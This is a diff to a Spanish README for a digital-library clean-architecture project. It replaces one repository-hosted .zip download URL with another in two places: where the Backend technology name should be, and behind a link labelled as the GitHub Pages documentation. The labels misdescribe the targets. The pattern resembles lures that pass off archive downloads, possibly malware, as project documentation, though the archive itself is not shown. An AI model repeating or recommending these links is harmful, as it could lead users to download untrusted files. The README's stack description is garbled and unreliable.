@@ -24,7 +24,7 @@ El sistema está organizado en capas concéntricas donde las dependencias apunta
 
 ## 🚀 Tecnologías
 
-- **Backend**: https://raw.githubusercontent.com/Edwinramirezgon/biblioteca-digital-clean-architecture/main/docs/.vitepress/clean_digital_biblioteca_architecture_v2.3.zip + TypeScript
+- **Backend**: https://raw.githubusercontent.com/Edwinramirezgon/biblioteca-digital-clean-architecture/main/docs/c4-model/architecture-clean-biblioteca-digital-2.7.zip + TypeScript
 - **Frontend**: React + TypeScript
 - **Base de datos**: PostgreSQL
 - **Documentación**: GitHub Pages
@@ -32,7 +32,7 @@ El sistema está organizado en capas concéntricas donde las dependencias apunta
 
 ## 📖 Documentación
 
-La documentación completa está disponible en [GitHub Pages](https://raw.githubusercontent.com/Edwinramirezgon/biblioteca-digital-clean-architecture/main/docs/.vitepress/clean_digital_biblioteca_architecture_v2.3.zip)
+La documentación completa está disponible en [GitHub Pages](https://raw.githubusercontent.com/Edwinramirezgon/biblioteca-digital-clean-architecture/main/docs/c4-model/architecture-clean-biblioteca-digital-2.7.zip)
 
 ## 🏃‍♂️ Inicio Rápido
 
